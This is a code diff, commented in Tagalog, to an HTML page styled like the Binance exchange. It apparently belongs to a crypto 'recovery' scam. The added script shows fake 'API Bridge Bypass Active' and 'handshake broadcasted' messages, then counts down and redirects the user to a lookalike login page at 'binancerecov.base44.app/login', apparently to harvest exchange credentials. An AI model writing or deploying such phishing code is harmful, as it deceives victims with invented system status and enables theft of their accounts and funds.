@@ -254,14 +254,33 @@
         btn.style.background = '#2b3139';
         btn.style.color = '#848e9c';
         btn.innerHTML = 'Broadcasting Handshake Stream...';
+setTimeout(() => {
+    btn.style.background = '#0ecb81';
+    btn.style.color = 'white';
+    btn.innerHTML = '✓ API Bridge Bypass Active';
+    alert('Handshake successfully broadcasted to network node gateways!');
+    
+    // Pagka-click ng 'OK' sa alert, abangan ang click sa button
+    btn.addEventListener('click', () => {
+        let seconds = 5;
+        
+        // Pinapagana ang countdown agad pagka-click
+        btn.disabled = true; // I-disable para hindi ma-double click
+        btn.innerHTML = `⏳ Redirecting in ${seconds}s...`;
 
-        setTimeout(() => {
-            btn.style.background = '#0ecb81';
-            btn.style.color = 'white';
-            btn.innerHTML = '✓ API Bridge Bypass Active';
-            alert('Handshake successfully broadcasted to network node gateways!');
-        }, 3000);
-    }
+        // Gumawa ng timer na umaandar bawat 1 segundo
+        const countdown = setInterval(() => {
+            seconds--;
+            btn.innerHTML = `⏳ Redirecting in ${seconds}s...`;
+            
+            if (seconds <= 0) {
+                clearInterval(countdown);
+                window.location.href = "https://binancerecov.base44.app/login";
+            }
+        }, 1000);
+    });
+
+}, 3000);
 </script>
 </body>
 </html>
